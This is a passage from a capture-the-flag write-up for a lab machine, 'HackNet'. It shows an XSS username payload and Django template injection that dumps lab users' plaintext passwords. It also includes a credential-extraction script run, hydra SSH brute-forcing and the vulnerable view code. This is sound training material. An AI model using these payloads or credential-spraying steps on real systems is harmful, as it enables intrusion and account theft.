ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll set my username as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">asdf&quot; onload=&quot;alert(1)</code></span><span class="SemanticString">. When checking the likes again:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780ee8c1dc05a177a5cb6" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_xss.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_xss.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f78087aa70dd69a3e96af4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">XSS on its own isn’t really useful unless someone is actively viewing the liked list, so I did some more testing with various payloads. The app seems to be also vulnerable to server-side template injection. I’ll set my username as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{7*7}}</code></span><span class="SemanticString"> and check the likes again, it resulted in an error:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780e3bf4cf8dda9ee7147" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_ssti_error.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_ssti_error.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f7801a8083e3e6cc0a0ad3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d40b98a88f781a891c5c0f678db9153" class="Divider"></div><h2 id="https://www.notion.so/2d40b98a88f781b7bd6edebc9f3becf6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2d40b98a88f781b7bd6edebc9f3becf6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h2><h3 id="https://www.notion.so/2d50b98a88f78018b170fc0ae2e15a99" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f78018b170fc0ae2e15a99"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Server-Side Template Injection:</span></span></h3><div id="https://www.notion.so/2eb0b98a88f78097abf0e09de2f52449" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Templates are great for generating dynamic content in web applications, allowing the use of placeholders that get populated by actual data at runtime. It becomes an issue when unsanitized user input are treated as part of the template and thus evaluated, which could lead to several server-side exploits attacks or even RCE. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://portswigger.net/research/server-side-template-injection">This Postswigger page</a></span><span class="SemanticString"> gives several examples of such attacks.</span></span></p></div><div id="https://www.notion.so/2eb0b98a88f780d1a99bd6d53bebc94a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A classic test payload is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{7*7}}</code></span><span class="SemanticString">, which would render as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">49</code></span><span class="SemanticString"> in a vulnerable app. In this case however, it resulted in an error. This is because the Django Template Engine, unlike Jinja2, is much more restrictive. It doesn’t evaluate Python expressions or allow calling object functions, which means code execution is probably not directly achievable here (ref: </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django">PayloadAllTheThings</a></span><span class="SemanticString">).</span></span></p></div><div id="https://www.notion.so/2eb0b98a88f7803ea9a2cac50bab79c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Instead I can try leaking context variables, which may contain sensitive information. One example is the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">request</code></span><span class="SemanticString"> variable, which almost always exists in Python web applications. I’ll set my username as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{request}}</code></span><span class="SemanticString">, when triggering the SSTI, it returned the request URL rather than erroring out.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780ff8b8fd490692454ae" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_request.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_request.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ec0b98a88f780988a3bd9f452f1c40c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can’t find a way to list all variables, so I started guessing with keywords. Most of them either resulted in nothing happening or an error, but several ones did return some data.</span></span></p></div><div id="https://www.notion.so/2ec0b98a88f780f4a8e9dc3a086ccc29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For example, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{user}}</code></span><span class="SemanticString"> is rendered as “AnonymousUser”:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780d9bc9cdae186509dab" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_anonuser.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_anonuser.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ec0b98a88f780138676fe243c51fc9a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{users}}</code></span><span class="SemanticString"> rendered a QuerySet of all users that liked the post:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78034b809d144ca5e40f5" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_users.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_users.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ec0b98a88f780ec831acd902a7fdbd5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The list is different for each post:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780c1b878d19edcca1576" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_anotherpost.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_anotherpost.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ec0b98a88f78063bd81db49bab06b70" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A QuerySet is basically a collection of objects returned from a database query, and provides methods for easy data-handling operations such as sorting and filtering. According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values">docs</a></span><span class="SemanticString">, it has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">values</code></span><span class="SemanticString"> method that returns the properties of all its objects in dictionary form. I’ll try </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{{users.values}}</code></span><span class="SemanticString">, and it dumped out all properties of the user objects, including plaintext credentials.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780459239edf33ae27ac5" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_creds.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/ssti_creds.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ec0b98a88f780a886d2c8559bf23dbe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll create </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/ssti.py">a Python script</a></span><span class="SemanticString"> to automatically go through all posts and extract the creds of all users. It found 26 of them in total.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78058a77ae76ec5ed1599" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> python ssti.py login ch3ng@ch3ng.com ch3ng
+
+[+] Login successful.
+[*] Username changed to &#x27;{{users.values}}&#x27;.
+[*] Extracting credentials... 50/50                                  
+[+] 26 credentials extracted in total:
+Username          Email                         Password
+----------------  ----------------------------  ----------------
+zero_day          zero_day@hushmail.com         Zer0D@yH@ck
+blackhat_wolf     blackhat_wolf@cypherx.com     Bl@ckW0lfH@ck
+datadive          datadive@darkmail.net         D@taD1v3r
+codebreaker       codebreaker@ciphermail.com    C0d3Br3@k!
+netninja          netninja@hushmail.com         N3tN1nj@2024
+darkseeker        darkseeker@darkmail.net       D@rkSeek3r#
+trojanhorse       trojanhorse@securemail.org    Tr0j@nH0rse!
+exploit_wizard    exploit_wizard@hushmail.com   Expl01tW!zard
+brute_force       brute_force@ciphermail.com    BrUt3F0rc3#
+{{users.values}}  ch3ng@ch3ng.com               ch3ng
+hexhunter         hexhunter@ciphermail.com      H3xHunt3r!
+rootbreaker       rootbreaker@exploitmail.net   R00tBr3@ker#
+packetpirate      packetpirate@exploitmail.net  P@ck3tP!rat3
+stealth_hawk      stealth_hawk@exploitmail.net  St3@lthH@wk
+whitehat          whitehat@darkmail.net         Wh!t3H@t2024
+virus_viper       virus_viper@securemail.org    V!rusV!p3r2024
+cyberghost        cyberghost@darkmail.net       Gh0stH@cker2024
+shadowcaster      shadowcaster@darkmail.net     Sh@d0wC@st!
+bytebandit        bytebandit@exploitmail.net    Byt3B@nd!t123
+shadowmancer      shadowmancer@cypherx.com      Sh@d0wM@ncer
+phreaker          phreaker@securemail.org       Phre@k3rH@ck
+shadowwalker      shadowwalker@hushmail.com     Sh@dowW@lk2024
+cryptoraven       cryptoraven@securemail.org    CrYptoR@ven42
+glitch            glitch@cypherx.com            Gl1tchH@ckz
+deepdive          deepdive@hacknet.htb          D33pD!v3r
+backdoor_bandit   mikey@hacknet.htb             mYd4rks1dEisH3re</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78097a148d0aa70b9287f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The last 2 accounts have email domains of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">@hacknet.htb</code></span><span class="SemanticString">. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backdoor_bandit</code></span><span class="SemanticString"> also has a different email name: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mikey</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780698fece2b63e545a7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve put all cred combinations into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">creds.txt</code></span><span class="SemanticString"> and threw it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hydra</code></span><span class="SemanticString">. It found one that works on SSH:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780c093b4faa372814d66" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> hydra -C creds.txt ssh://hacknet.htb
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-25 16:44:02
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries, ~2 tries per task
+[DATA] attacking ssh://hacknet.htb:22/
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re</span></mark></span><span class="SemanticString"><span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-25 16:44:13</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78055b53ec2f4af2f5f8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With that, I’ll get a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mikey</code></span><span class="SemanticString"> and grab the user flag.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78098a793fe1daa255c75" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> ssh mikey@hacknet.htb        
+
+Warning: Permanently added &#x27;hacknet.htb&#x27; (ED25519) to the list of known hosts.
+mikey@hacknet.htb&#x27;s password: 
+Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec 25 01:30:24 2025 from 10.10.14.79
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)</span></span></span></code></pre><h3 id="https://www.notion.so/2d50b98a88f780f0b5b9e8347b742d59" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f780f0b5b9e8347b742d59"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">User Flag:</span></span></h3><pre id="https://www.notion.so/2d50b98a88f78000bb7cd9b467466721" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+2cc6cc13************************</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78037b579c01506258715" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d40b98a88f78110b745e2979edda5a7" class="Divider"></div><h2 id="https://www.notion.so/2d40b98a88f781408c71cb1835c3cf42" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2d40b98a88f781408c71cb1835c3cf42"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Lateral Movement from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mikey</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/2d50b98a88f7801b9f35ec0f9996e526" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f7801b9f35ec0f9996e526"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Source Code:</span></span></h3><div id="https://www.notion.so/2d50b98a88f7806aa6d8ebf7810814d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Django app’s folder is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/www/HackNet/</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780499f54c8735b0c9096" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 32
+drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
+drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
+drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
+-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
+drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
+-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
+drwxr-xr-x 2 sandy sandy    4096 Dec 24 09:58 media
+drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
+drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f7806ea746c794c327d330" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s an empty SQLite DB and several subfolders, all of which are owned by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sandy</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78007a354c389363b8878" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d50b98a88f7807db675fb2117354d42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">backups:</strong></span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78098b769c601b28c05b9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet$</span></mark></span><span class="SemanticString"><span> ls -la backups/
+
+total 56
+drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
+drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
+-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
+-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
+-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78072a22ae24724809359" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backups/</code></span><span class="SemanticString"> contains 3 GPG-encrypted database dump. Not much could be done without the keys, I’ll leave this for later.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7809f8c68e3d39767e508" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d50b98a88f78008a9bbfd2c7dd55985" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SocialNetwork:</strong></span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780ecad0be4f5239721af" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mikey@hacknet:/var/www/HackNet/SocialNetwork$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 68
+drwxr-xr-x 6 sandy sandy  4096 Sep  8 05:22 .
+drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
+-rw-r--r-- 1 sandy sandy   298 May 31  2024 admin.py
+-rw-r--r-- 1 sandy sandy   157 May 31  2024 apps.py
+-rw-r--r-- 1 sandy sandy     0 May 31  2024 __init__.py
+drwxr-xr-x 3 sandy sandy  4096 Aug  8  2024 migrations
+-rw-r--r-- 1 sandy sandy  2368 Aug  8  2024 models.py
+-rw-r--r-- 1 sandy sandy  1126 Jun 20  2024 news_generator.py
+drwxr-xr-x 2 sandy sandy  4096 Sep  8 05:22 __pycache__
+drwxr-xr-x 2 sandy sandy  4096 May 31  2024 static
+drwxr-xr-x 3 sandy sandy  4096 May 31  2024 templates
+-rw-r--r-- 1 sandy sandy  1502 May 31  2024 urls.py
+-rw-r--r-- 1 sandy sandy 22547 Sep  8 05:22 views.py</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f7805996f4d6e6bcabe48b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">These are mostly source code for the Django app. In </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">views.py</code></span><span class="SemanticString">, I found the function that made the app vulnerable to SSTI:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780cd935af178ccd31590" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">likes</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> pk<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token string">"email"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>session<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span>
+
+    session_user <span class="token operator">=</span> get_object_or_404<span class="token punctuation">(</span>SocialUser<span class="token punctuation">,</span> email<span class="token operator">=</span>request<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    post <span class="token operator">=</span> get_object_or_404<span class="token punctuation">(</span>SocialArticle<span class="token punctuation">,</span>pk<span class="token operator">=</span>pk<span class="token punctuation">)</span>
+    users <span class="token operator">=</span> post<span class="token punctuation">.</span>likes<span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    engine <span class="token operator">=</span> engines<span class="token punctuation">[</span><span class="token string">"django"</span><span class="token punctuation">]</span>
+    template_string <span class="token operator">=</span> <span class="token string">""</span>
+
+    context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"users"</span><span class="token punctuation">:</span> users<span class="token punctuation">}</span>
+
+    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>is_hidden <span class="token keyword">or</span> user <span class="token operator">==</span> session_user<span class="token punctuation">:</span>
+            template_string <span class="token operator">+=</span> <span class="token string">"&lt;div class=\"likes-review-item\">&lt;a href=\"/profile/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>pk<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\">&lt;img src=\""</span><span class="token operator">+</span>user<span class="token punctuation">.</span>picture<span class="token punctuation">.</span>url<span class="token operator">+</span><span class="token string">"\" title=\""</span><span class="token operator">+</span>user<span class="token punctuation">.</span>username<span class="token operator">+</span><span class="token string">"\">&lt;/a>&lt;/div>"</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        template <span class="token operator">=</span> engine<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span>template_string<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        template <span class="token operator">=</span> engine<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token string">"&lt;div class=\"likes-review-item\">&lt;a>Something went wrong...&lt;/a>&lt;/div>"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> HttpResponse<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>context<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78085bfc4c71a391faa97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The template string is dynamically generated with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">user.username</code></span><span class="SemanticString">, and there’s no validation at all. Hence it’s possible to inject extra template variables.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78073bd72f24fabbd3fa0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As demonstrated earlier, this makes it vulnerable to SSTI, XSS and HTML injection at the same time.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78039a4c4cfcff43c002b" class="ColorfulBlock 